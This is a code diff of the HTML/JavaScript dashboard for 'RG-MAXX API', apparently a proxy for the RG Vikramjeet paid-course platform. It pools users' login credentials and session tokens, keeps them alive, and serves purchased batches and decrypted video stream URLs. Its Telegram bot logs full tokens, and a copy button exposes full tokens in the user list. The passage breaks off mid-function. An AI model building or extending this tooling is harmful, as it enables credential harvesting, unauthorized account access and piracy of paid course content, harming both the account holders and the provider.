-@media(max-width:640px){
-  .nav{padding:0 16px}
-  .hero{padding:50px 16px 30px}
-  .hero h1{font-size:2.2rem}
-  .main{padding:0 16px 60px}
-  .stats{padding:0 16px 30px;gap:10px}
-  .batch-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px}
-  .tabs{padding:4px}
-  .tab{padding:6px 12px;font-size:.75rem}
+/* ── SECTION DIVIDER ── */
+.divider{
+  font-size:.62rem;font-weight:800;letter-spacing:2px;
+  text-transform:uppercase;color:var(--muted);
+  padding:14px 16px 6px;display:flex;align-items:center;gap:8px;
+}
+.divider::after{content:'';flex:1;height:1px;background:var(--border)}
+
+@media(min-width:600px){
+  .batch-list,.user-list,.api-list,.log-feed,.health-grid{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+  }
+  .batch-card,.user-card,.api-card,.log-entry,.health-card{width:100%}
 }
 </style>
 </head>
 <body>
 
-<!-- NAV -->
+<div class="statusbar"></div>
+
+<!-- TOP NAV -->
 <nav class="nav">
-  <div class="brand">
-    <div class="brand-icon">R</div>
-    <div>
-      <div class="brand-name"><span>RG-MAXX</span> API <span class="v-badge">v5</span></div>
-    </div>
+  <div class="nav-brand">
+    <div class="nav-logo">R</div>
+    <span class="nav-title">RG‑MAXX <span class="nav-badge">V10</span></span>
   </div>
   <div class="nav-right">
-    <div class="pill"><div class="dot"></div> <span id="nav-tc">...</span> tokens</div>
-    <div class="pill" style="color:var(--green);font-size:.7rem;font-weight:700;">24/7 LIVE</div>
+    <div class="token-pill"><span class="tp-num" id="nav-tc">—</span> tokens</div>
+    <div class="live-pill"><div class="pulse-dot"></div>LIVE</div>
   </div>
 </nav>
 
 <!-- HERO -->
-<section class="hero">
-  <div class="hero-tag">⚡ RG Vikramjeet Course Proxy</div>
-  <h1>RG-MAXX API v5</h1>
-  <p>ID/Password Login · Token Pool · 24/7 KeepAlive · Telegram Bot · Premium Dashboard</p>
-</section>
+<div class="hero">
+  <div class="hero-tag">⚡ RG Vikramjeet Platform</div>
+  <div class="hero-title">RG‑MAXX API</div>
+  <div class="hero-sub">Token Pool · Auto Batches · 24/7 KeepAlive · Telegram Bot</div>
+</div>
 
 <!-- STATS -->
-<div class="stats" id="stats-row">
-  <div class="stat"><div class="stat-val" id="s-total">—</div><div class="stat-lbl">Total Tokens</div></div>
-  <div class="stat"><div class="stat-val" id="s-manual">—</div><div class="stat-lbl">Manual</div></div>
-  <div class="stat"><div class="stat-val" id="s-dynamic">—</div><div class="stat-lbl">Dynamic</div></div>
-  <div class="stat"><div class="stat-val" id="s-batches">—</div><div class="stat-lbl">Total Batches</div></div>
-  <div class="stat"><div class="stat-val" id="s-bot" style="font-size:1.4rem">—</div><div class="stat-lbl">Telegram Bot</div></div>
+<div class="stats-scroll" id="stats-row">
+  <div class="stat-chip"><div class="stat-num" id="s-total">—</div><div class="stat-lbl">Tokens</div></div>
+  <div class="stat-chip"><div class="stat-num" id="s-manual">—</div><div class="stat-lbl">Manual</div></div>
+  <div class="stat-chip"><div class="stat-num" id="s-tg">—</div><div class="stat-lbl">Telegram</div></div>
+  <div class="stat-chip"><div class="stat-num" id="s-batches">—</div><div class="stat-lbl">Batches</div></div>
+  <div class="stat-chip"><div class="stat-num" id="s-today">—</div><div class="stat-lbl">Today</div></div>
+  <div class="stat-chip"><div class="stat-num" id="s-bot" style="font-size:1.2rem">—</div><div class="stat-lbl">Bot</div></div>
 </div>
 
 <!-- MAIN -->
 <div class="main">
 
-  <!-- TABS -->
-  <div class="tabs" id="tabs">
-    <button class="tab active" onclick="switchTab('batches',this)">📚 All Batches</button>
-    <button class="tab" onclick="switchTab('explorer',this)">🔍 Explorer</button>
-    <button class="tab" onclick="switchTab('users',this)">👥 Users Pool</button>
-    <button class="tab" onclick="switchTab('health',this)">💓 Health</button>
-    <button class="tab" onclick="switchTab('api',this)">📖 API Docs</button>
-  </div>
-
-  <!-- BATCHES PANEL -->
+  <!-- ───── PANEL: BATCHES ───── -->
   <div class="panel active" id="panel-batches">
-    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">
-      <div class="section-title" style="margin:0;flex:1">All Purchased Batches</div>
-      <button onclick="loadBatches()" style="background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 14px;border-radius:8px;cursor:pointer;font-size:.75rem;margin-left:16px">↻ Refresh</button>
+    <div class="sec-header">
+      <div class="sec-title">All Batches</div>
+      <button class="refresh-btn" onclick="loadBatches()">↻ Refresh</button>
     </div>
     <div id="batches-container">
-      <div class="loader"><div class="spin"></div> Loading batches...</div>
+      <div class="loader"><div class="spin"></div>Loading batches...</div>
     </div>
   </div>
 
-  <!-- EXPLORER PANEL -->
-  <div class="panel" id="panel-explorer">
-    <div style="margin-bottom:16px">
-      <div class="section-title" style="margin:0 0 12px">🔍 Content Explorer</div>
-      <div style="font-size:.8rem;color:var(--muted);margin-bottom:16px">Batch → Subjects → Topics → Concepts → Videos/PDFs — sab ek jagah</div>
-      <div id="exp-breadcrumb" style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;font-size:.78rem;margin-bottom:16px;min-height:22px"></div>
-    </div>
-    <div id="exp-batches-step">
-      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
-        <input id="exp-search" type="text" placeholder="🔎 Batch name ya ID search..." oninput="filterExpBatches()" style="flex:1;padding:8px 12px;background:var(--surface);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.82rem;outline:none">
-      </div>
-      <div id="exp-batches-grid" class="batch-grid"><div class="loader"><div class="spin"></div> Loading...</div></div>
-    </div>
-    <div id="exp-subjects-step" style="display:none">
-      <div class="section-title" style="font-size:.85rem;margin-bottom:12px">📖 Subjects</div>
-      <div id="exp-subjects-grid" class="user-grid"></div>
-    </div>
-    <div id="exp-topics-step" style="display:none">
-      <div class="section-title" style="font-size:.85rem;margin-bottom:12px">📝 Topics</div>
-      <div id="exp-topics-grid" class="user-grid"></div>
-    </div>
-    <div id="exp-concepts-step" style="display:none">
-      <div class="section-title" style="font-size:.85rem;margin-bottom:12px">💡 Concepts</div>
-      <div id="exp-concepts-grid" class="user-grid"></div>
-    </div>
-    <div id="exp-content-step" style="display:none">
-      <div class="section-title" style="font-size:.85rem;margin-bottom:12px">🎬 Videos &amp; PDFs</div>
-      <div id="exp-content-list"></div>
-    </div>
-  </div>
-
-  <!-- USERS PANEL -->
+  <!-- ───── PANEL: USERS ───── -->
   <div class="panel" id="panel-users">
-    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">
-      <div class="section-title" style="margin:0;flex:1">Token Pool</div>
-      <button onclick="loadUsers()" style="background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 14px;border-radius:8px;cursor:pointer;font-size:.75rem;margin-left:16px">↻ Refresh</button>
+    <div class="sec-header">
+      <div class="sec-title">Token Pool</div>
+      <button class="refresh-btn" onclick="loadUsers()">↻ Refresh</button>
     </div>
     <div id="users-container">
-      <div class="loader"><div class="spin"></div> Loading users...</div>
+      <div class="loader"><div class="spin"></div>Loading...</div>
     </div>
   </div>
 
-  <!-- HEALTH PANEL -->
-  <div class="panel" id="panel-health">
-    <div class="info-box" style="background:rgba(0,230,118,.04);border-color:rgba(0,230,118,.2)">
-      <h3>💓 24/7 Token KeepAlive System</h3>
-      <div style="font-size:.82rem;color:var(--muted);line-height:1.8">
-        Server har <strong style="color:var(--green)">25 minute</strong> pe silently sab tokens ko ping karta hai.<br>
-        Agar koi token <strong style="color:var(--red)">3 baar fail</strong> ho jaye to automatically pool se remove hota hai + Telegram alert aata hai.<br>
-        Manual users (users.js) kabhi remove nahi hote — sirf ping hote hain.
+  <!-- ───── PANEL: TELEGRAM ───── -->
+  <div class="panel" id="panel-telegram">
+    <div class="sec-header">
+      <div class="sec-title">Telegram Tokens</div>
+      <button class="refresh-btn" onclick="loadTelegram()">↻ Refresh</button>
+    </div>
+
+    <!-- TG Overview -->
+    <div class="tg-overview">
+      <div class="tg-title">📊 Telegram Stats</div>
+      <div class="tg-stats">
+        <div class="tg-stat-item">
+          <div class="tg-stat-num" id="tg-total">—</div>
+          <div class="tg-stat-lbl">TG Tokens</div>
+        </div>
+        <div class="tg-stat-item">
+          <div class="tg-stat-num" id="tg-users">—</div>
+          <div class="tg-stat-lbl">User IDs</div>
+        </div>
+        <div class="tg-stat-item">
+          <div class="tg-stat-num" id="tg-batches">—</div>
+          <div class="tg-stat-lbl">Batches</div>
+        </div>
+        <div class="tg-stat-item">
+          <div class="tg-stat-num" id="tg-today">—</div>
+          <div class="tg-stat-lbl">Today</div>
+        </div>
       </div>
     </div>
-    <div class="section-title">Token Health Status</div>
-    <div id="health-container">
-      <div class="loader"><div class="spin"></div> Loading health data...</div>
+
+    <!-- TG Token Cards -->
+    <div class="divider">🤖 Bot Tokens</div>
+    <div id="tg-tokens-container">
+      <div class="loader"><div class="spin"></div>Loading Telegram tokens...</div>
+    </div>
+
+    <!-- Log Feed -->
+    <div class="divider">📋 Recent Logs</div>
+    <div id="tg-logs-container">
+      <div class="loader"><div class="spin"></div>Loading logs...</div>
     </div>
   </div>
 
-  <!-- API PANEL -->
+  <!-- ───── PANEL: HEALTH ───── -->
+  <div class="panel" id="panel-health">
+    <div class="sec-header">
+      <div class="sec-title">Token Health</div>
+      <button class="refresh-btn" onclick="loadHealth()">↻ Refresh</button>
+    </div>
+    <div class="info-box" style="background:rgba(0,230,118,.04);border-color:rgba(0,230,118,.2)">
+      <div class="info-title">💓 24/7 KeepAlive System</div>
+      <div style="font-size:.78rem;color:var(--text2);line-height:1.7">
+        Server har <strong style="color:var(--green)">25 min</strong> pe silently sab tokens ko ping karta hai.<br>
+        3 baar fail → auto remove + Telegram alert.<br>
+        Manual users kabhi remove nahi hote.
+      </div>
+    </div>
+    <div id="health-container">
+      <div class="loader"><div class="spin"></div>Loading health...</div>
+    </div>
+  </div>
+
+  <!-- ───── PANEL: API ───── -->
   <div class="panel" id="panel-api">
+    <div class="sec-header">
+      <div class="sec-title">API Reference</div>
+    </div>
 
     <div class="info-box">
-      <h3>🆕 v7 — ID+Password Login</h3>
-      <pre>// Option A — Mobile+Password
+      <div class="info-title">🚀 v10 — Full Token in Logs + Auto Batches</div>
+      <pre>// Login with mobile+password
 POST /api/login
 { "mobile": "9876543210", "password": "yourpass" }
 
-// Option B — Direct Token
+// Add token directly
 POST /api/login
 { "userId": "123456", "token": "eyJ..." }
 
@@ -572,397 +672,428 @@ POST /api/login
 /add 123456 eyJ0eXAi...</pre>
     </div>
 
-    <div class="section-title">🔐 Authentication</div>
-    <div class="api-card">
-      <div class="api-top">
-        <span class="method POST">POST</span>
-        <span class="endpoint">/api/login</span>
-        <span class="new-badge">v5</span>
+    <!-- Auth -->
+    <div class="divider">🔐 Auth</div>
+    <div class="api-list" id="api-auth">
+      <div class="api-card">
+        <div class="api-top"><span class="method POST">POST</span><span class="endpoint">/api/login</span><span class="new-tag">v10</span></div>
+        <div class="api-desc">ID+Password ya Token se login. Batches auto-fetch, pool mein add, Telegram full token log.</div>
+        <button class="try-btn" onclick="tryApi('/api/login','POST',{mobile:'TEST',password:'TEST'})">▶ Try</button>
+        <div class="api-response" id="resp-login"></div>
       </div>
-      <div class="api-desc">ID+Password ya Token se login. Batches auto-fetch (ek baar), pool mein add, Telegram log.</div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/add-token?userid=123&token=eyJ...</span></div>
-      <div class="api-desc">URL se token add karo</div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method POST">POST</span><span class="endpoint">/api/bulk-login</span></div>
-      <div class="api-desc">Array of <code>{userId, token}</code> — bulk add</div>
-    </div>
-
-    <div class="section-title">👥 Pool Management</div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/users</span></div>
-      <div class="api-desc">All users list with source, batches, health</div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/pool</span></div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/health</span></div>
-      <div class="api-desc">Token health status (ping failures)</div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/remove-token?userid=123</span></div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/reload-users?secret=...</span></div>
-      <div class="api-desc">users.js reload (no restart)</div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/clear-pool?secret=...</span></div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/add-token</span></div>
+        <div class="api-desc">URL se token add karo</div>
+        <div class="api-params">?userid=123&token=eyJ...</div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method POST">POST</span><span class="endpoint">/api/bulk-login</span></div>
+        <div class="api-desc">Array of {userId, token} — bulk add</div>
+      </div>
     </div>
 
-    <div class="section-title">📚 Courses & Content</div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/all-batches</span></div>
-      <div class="api-desc">All unique batches combined (no duplicates)</div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/my-courses?userid=123</span></div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/subjects?courseid=257</span></div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/topics?courseid=257&subjectid=1</span></div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/concepts?courseid=257&subjectid=1&topicid=1</span></div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/videos?courseid=257&subjectid=1&topicid=1&conceptid=1</span></div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/video-details?course_id=257&video_id=12345</span></div>
-      <div class="api-desc">Decrypted stream URLs</div>
+    <!-- Pool -->
+    <div class="divider">👥 Pool</div>
+    <div class="api-list">
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/users</span></div>
+        <div class="api-desc">All users — source, batches, health</div>
+        <button class="try-btn" onclick="tryApi('/api/users','GET')">▶ Try</button>
+        <div class="api-response" id="resp-users"></div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/status</span></div>
+        <div class="api-desc">Server status, token count, bot status</div>
+        <button class="try-btn" onclick="tryApi('/api/status','GET')">▶ Try</button>
+        <div class="api-response" id="resp-status"></div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/health</span></div>
+        <div class="api-desc">Token health (ping failures)</div>
+        <button class="try-btn" onclick="tryApi('/api/health','GET')">▶ Try</button>
+        <div class="api-response" id="resp-health"></div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/pool</span></div>
+        <div class="api-desc">Pool overview with batch names</div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/telegram-stats</span></div>
+        <div class="api-desc">Telegram tokens + logs</div>
+        <button class="try-btn" onclick="tryApi('/api/telegram-stats','GET')">▶ Try</button>
+        <div class="api-response" id="resp-tg"></div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/remove-token</span></div>
+        <div class="api-params">?userid=123</div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/reload-users</span></div>
+        <div class="api-params">?secret=YOUR_SECRET</div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/clear-pool</span></div>
+        <div class="api-params">?secret=YOUR_SECRET</div>
+      </div>
     </div>
 
-    <div class="section-title">🧪 Tests</div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/tests?testseriesid=100</span></div>
-    </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/questions?url=https://...</span></div>
+    <!-- Content -->
+    <div class="divider">📚 Content</div>
+    <div class="api-list">
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/all-batches</span></div>
+        <div class="api-desc">All unique batches (no duplicates, with thumbnails)</div>
+        <button class="try-btn" onclick="tryApi('/api/all-batches','GET')">▶ Try</button>
+        <div class="api-response" id="resp-batches"></div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/my-courses</span></div>
+        <div class="api-params">?userid=123</div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/subjects</span></div>
+        <div class="api-params">?courseid=257</div>
+        <button class="try-btn" onclick="tryApi('/api/subjects?courseid=257','GET')">▶ Try</button>
+        <div class="api-response" id="resp-subjects"></div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/topics</span></div>
+        <div class="api-params">?courseid=257&subjectid=1</div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/concepts</span></div>
+        <div class="api-params">?courseid=257&subjectid=1&topicid=1</div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/videos</span></div>
+        <div class="api-params">?courseid=257&subjectid=1&topicid=1&conceptid=1</div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/video-details</span></div>
+        <div class="api-desc">Decrypted stream URLs</div>
+        <div class="api-params">?course_id=257&video_id=12345</div>
+      </div>
     </div>
 
-    <div class="section-title">🤖 Telegram Bot</div>
-    <div class="info-box" style="background:rgba(0,212,255,.04);border-color:rgba(0,212,255,.2)">
-      <h3>Bot Commands</h3>
+    <!-- Tests -->
+    <div class="divider">🧪 Tests</div>
+    <div class="api-list">
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/tests</span></div>
+        <div class="api-params">?testseriesid=100</div>
+      </div>
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/questions</span></div>
+        <div class="api-params">?url=https://...</div>
+      </div>
+    </div>
+
+    <!-- Bot -->
+    <div class="divider">🤖 Telegram Bot</div>
+    <div class="info-box" style="background:rgba(0,229,255,.04);border-color:rgba(0,229,255,.2);margin-bottom:12px">
+      <div class="info-title">Bot Commands</div>
       <pre>/start              — Help
 /login MOBILE PASS  — ID+Password login
-/add USER_ID TOKEN  — Token add
+/add USER_ID TOKEN  — Token add (full token log)
 /remove USER_ID     — Token remove
 /disconnect         — Telegram tokens saare hatao
 /status             — Pool status</pre>
     </div>
-    <div class="api-card">
-      <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/set-webhook</span></div>
-      <div class="api-desc">One-time setup: webhook register karo</div>
+    <div class="api-list" style="margin-bottom:16px">
+      <div class="api-card">
+        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/set-webhook</span></div>
+        <div class="api-desc">One-time setup — webhook register karo</div>
+        <button class="try-btn" onclick="tryApi('/api/set-webhook','GET')">▶ Setup</button>
+        <div class="api-response" id="resp-webhook"></div>
+      </div>
     </div>
-
-  </div><!-- /panel-api -->
+  </div>
 
 </div><!-- /main -->
 
-<footer>RG-MAXX API v8 &nbsp;•&nbsp; 24/7 KeepAlive &nbsp;•&nbsp; RG Vikramjeet Platform</footer>
+<!-- BOTTOM NAV -->
+<nav class="bottom-nav">
+  <button class="bn-item active" onclick="switchTab('batches',this)" id="bn-batches">
+    <div class="bn-icon">📚</div>
+    <div class="bn-label">Batches</div>
+    <div class="bn-indicator"></div>
+  </button>
+  <button class="bn-item" onclick="switchTab('users',this)" id="bn-users">
+    <div class="bn-icon">👥</div>
+    <div class="bn-label">Users</div>
+    <div class="bn-indicator"></div>
+  </button>
+  <button class="bn-item" onclick="switchTab('telegram',this)" id="bn-telegram">
+    <div class="bn-icon">🤖</div>
+    <div class="bn-label">Telegram</div>
+    <div class="bn-indicator"></div>
+  </button>
+  <button class="bn-item" onclick="switchTab('health',this)" id="bn-health">
+    <div class="bn-icon">💓</div>
+    <div class="bn-label">Health</div>
+    <div class="bn-indicator"></div>
+  </button>
+  <button class="bn-item" onclick="switchTab('api',this)" id="bn-api">
+    <div class="bn-icon">📖</div>
+    <div class="bn-label">API</div>
+    <div class="bn-indicator"></div>
+  </button>
+</nav>
 
 <script>
-// ── TAB SWITCH ──────────────────────────────────────────────────────────────
+// ── TAB SWITCH ───────────────────────────────────────────────────────────────
 function switchTab(name, btn) {
-  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.getElementById('panel-' + name).classList.add('active');
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.bn-item').forEach(b=>b.classList.remove('active'));
+  document.getElementById('panel-'+name).classList.add('active');
   btn.classList.add('active');
-  if (name === 'batches') loadBatches();
-  if (name === 'users') loadUsers();
-  if (name === 'health') loadHealth();
-  if (name === 'explorer') initExplorer();
+  if(name==='batches') loadBatches();
+  else if(name==='users') loadUsers();
+  else if(name==='telegram') loadTelegram();
+  else if(name==='health') loadHealth();
+  window.scrollTo({top:0,behavior:'smooth'});
 }
 
 // ── INIT STATS ───────────────────────────────────────────────────────────────
 async function initStats() {
   try {
-    const [st, us] = await Promise.all([
-      fetch('/api/status').then(r=>r.json()),
-      fetch('/api/users').then(r=>r.json())
+    const [st, us, tg] = await Promise.all([
+      fetch('/api/status').then(r=>r.json()).catch(()=>({})),
+      fetch('/api/users').then(r=>r.json()).catch(()=>({})),
+      fetch('/api/telegram-stats').then(r=>r.json()).catch(()=>({})),
     ]);
-    document.getElementById('nav-tc').textContent = st.tokens || 0;
-    document.getElementById('s-total').textContent = st.tokens || 0;
-    document.getElementById('s-manual').textContent = us.manual || 0;
-    document.getElementById('s-dynamic').textContent = us.dynamic || 0;
-    document.getElementById('s-bot').textContent = st.telegram_bot ? '✅' : '❌';
-  } catch(e) {}
+    document.getElementById('nav-tc').textContent = st.tokens||0;
+    document.getElementById('s-total').textContent = st.tokens||0;
+    document.getElementById('s-manual').textContent = us.manual||0;
+    document.getElementById('s-tg').textContent = tg.telegram_count||0;
+    document.getElementById('s-today').textContent = tg.today_logins||0;
+    document.getElementById('s-bot').textContent = st.telegram_bot ? '✅':'❌';
+  } catch(e){}
 }
 
 // ── LOAD BATCHES ─────────────────────────────────────────────────────────────
 async function loadBatches() {
-  const el = document.getElementById('batches-container');
-  el.innerHTML = '<div class="loader"><div class="spin"></div> Fetching batches from all tokens...</div>';
+  const el=document.getElementById('batches-container');
+  el.innerHTML='<div class="loader"><div class="spin"></div>Fetching from all tokens...</div>';
   try {
-    const data = await fetch('/api/all-batches').then(r=>r.json());
-    document.getElementById('s-batches').textContent = data.total || 0;
-    if (!data.data || data.data.length === 0) {
-      el.innerHTML = '<div class="empty"><div class="empty-icon">📭</div><div>No batches found. Login karo ya users.js mein token add karo.</div></div>';
+    const data=await fetch('/api/all-batches').then(r=>r.json());
+    document.getElementById('s-batches').textContent=data.total||0;
+    if(!data.data||data.data.length===0){
+      el.innerHTML='<div class="empty"><div class="empty-icon">📭</div><div>No batches. Token add karo.</div></div>';
       return;
     }
-    el.innerHTML = '<div class="batch-grid">' +
-      data.data.map(b => batchCard(b)).join('') +
-    '</div>';
-  } catch(e) {
-    el.innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading batches. Server check karo.</div></div>';
+    el.innerHTML='<div class="batch-list">'+data.data.map(batchCard).join('')+'</div>';
+  } catch(e){
+    el.innerHTML='<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading batches.</div></div>';
   }
 }
 
 function batchCard(b) {
-  const thumb = b.thumbnail
-    ? \`<img class="batch-thumb" src="\${b.thumbnail}" alt="\${b.name}" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">\`
-    : '';
-  const placeholder = \`<div class="batch-thumb-placeholder" \${b.thumbnail ? 'style="display:none"' : ''}>📚</div>\`;
-  const expiry = b.expiry
-    ? \`<div class="batch-expiry"><div class="exp-dot"></div> \${new Date(b.expiry).toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'}) || b.expiry}</div>\`
-    : '';
-  return \`
-    <div class="batch-card">
-      \${thumb}\${placeholder}
-      <div class="batch-info">
-        <div class="batch-id">ID: \${b.id}</div>
-        <div class="batch-name">\${b.name || 'Unknown Batch'}</div>
-        \${expiry}
-      </div>
-    </div>\`;
-}
-
-// ── LOAD USERS ───────────────────────────────────────────────────────────────
-async function loadUsers() {
-  const el = document.getElementById('users-container');
-  el.innerHTML = '<div class="loader"><div class="spin"></div> Loading users...</div>';
-  try {
-    const data = await fetch('/api/users').then(r=>r.json());
-    if (!data.users || data.users.length === 0) {
-      el.innerHTML = '<div class="empty"><div class="empty-icon">👥</div><div>No users in pool. Login karo.</div></div>';
-      return;
-    }
-    const srcClass = {manual:'src-manual',telegram:'src-telegram',login:'src-login',api:'src-api',bulk:'src-bulk'};
-    el.innerHTML = '<div class="user-grid">' +
-      data.users.map(u => {
-        const avatar = (u.name || u.userId || '?')[0].toUpperCase();
-        const cls = srcClass[u.source] || 'src-api';
-        const addedDate = u.addedAt ? new Date(u.addedAt).toLocaleDateString('en-IN') : '—';
-        return \`
-          <div class="user-card">
-            <div class="user-top">
-              <div class="user-avatar">\${avatar}</div>
-              <div>
-                <div class="user-name">\${u.name || 'User ' + u.userId}</div>
-                <div class="user-id">\${u.userId}</div>
-              </div>
-              <span class="source-tag \${cls}">\${u.source || 'api'}</span>
-            </div>
-            <div class="user-stat">📚 <strong>\${u.batchCount}</strong> batches &nbsp;|&nbsp; Added: \${addedDate}</div>
-            <div class="user-stat" style="margin-top:4px;font-size:.65rem;word-break:break-all;color:var(--muted)">🔑 <span style="cursor:pointer;color:var(--accent2)" onclick="navigator.clipboard.writeText('\${u.fullToken||u.tokenPreview}').then(()=>alert('Token copied!'))" title="Click to copy full token">\${u.tokenPreview} 📋</span></div>
-            <div class="health-bar"><div class="health-bar-fill" style="width:100%"></div></div>
-          </div>\`;
-      }).join('') +
-    '</div>';
-  } catch(e) {
-    el.innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading users.</div></div>';
-  }
-}
-
-// ── LOAD HEALTH ──────────────────────────────────────────────────────────────
-async function loadHealth() {
-  const el = document.getElementById('health-container');
-  el.innerHTML = '<div class="loader"><div class="spin"></div> Loading health...</div>';
-  try {
-    const data = await fetch('/api/health').then(r=>r.json());
-    if (!data.health || data.health.length === 0) {
-      el.innerHTML = '<div class="empty"><div class="empty-icon">💓</div><div>No tokens in pool.</div></div>';
-      return;
-    }
-    el.innerHTML = '<div class="user-grid">' +
-      data.health.map(h => {
-        const color = h.failures === 0 ? 'var(--green)' : h.failures < 3 ? 'var(--yellow)' : 'var(--red)';
-        const fillW = Math.max(0, 100 - h.failures * 33);
-        const statusIcon = h.failures === 0 ? '🟢' : h.failures < 3 ? '🟡' : '🔴';
-        return \`
-          <div class="user-card">
-            <div class="user-top">
-              <div class="user-avatar" style="background:linear-gradient(135deg,\${color},\${color}88)">\${statusIcon}</div>
-              <div>
-                <div class="user-name">\${h.name || 'User ' + h.userId}</div>
-                <div class="user-id">\${h.userId}</div>
-              </div>
-              <span class="source-tag src-manual" style="color:\${color};border-color:\${color}33">\${h.status}</span>
-            </div>
-            <div class="user-stat">❌ Failures: <strong style="color:\${color}">\${h.failures}/3</strong> &nbsp;|&nbsp; Source: \${h.source}</div>
-            <div class="health-bar" style="margin-top:10px">
-              <div class="health-bar-fill" style="width:\${fillW}%;background:\${color}"></div>
-            </div>
-          </div>\`;
-      }).join('') +
-    '</div>';
-  } catch(e) {
-    el.innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading health data.</div></div>';
-  }
-}
-
-
-// ── CONTENT EXPLORER ─────────────────────────────────────────────────────────
-let expAllBatches = [];
-let expState = { batchId: null, batchName: null, subjectId: null, subjectName: null, topicId: null, topicName: null, conceptId: null, conceptName: null };
-
-function expShowStep(step) {
-  ['batches','subjects','topics','concepts','content'].forEach(s => {
-    document.getElementById('exp-'+s+'-step').style.display = s===step ? '' : 'none';
-  });
-}
-
-function expSetBreadcrumb() {
-  const bc = document.getElementById('exp-breadcrumb');
-  const parts = [];
-  parts.push(`<span style="cursor:pointer;color:var(--accent)" onclick="expGoBack('batches')">📚 All Batches</span>`);
-  if (expState.batchName) parts.push(`<span style="color:var(--muted)">›</span><span style="cursor:pointer;color:var(--accent2)" onclick="expGoBack('subjects')">${expState.batchName}</span>`);
-  if (expState.subjectName) parts.push(`<span style="color:var(--muted)">›</span><span style="cursor:pointer;color:var(--accent2)" onclick="expGoBack('topics')">${expState.subjectName}</span>`);
-  if (expState.topicName) parts.push(`<span style="color:var(--muted)">›</span><span style="cursor:pointer;color:var(--accent2)" onclick="expGoBack('concepts')">${expState.topicName}</span>`);
-  if (expState.conceptName) parts.push(`<span style="color:var(--muted)">›</span><span style="color:var(--text)">${expState.conceptName}</span>`);
-  bc.innerHTML = parts.join(' ');
-}
-
-function expGoBack(to) {
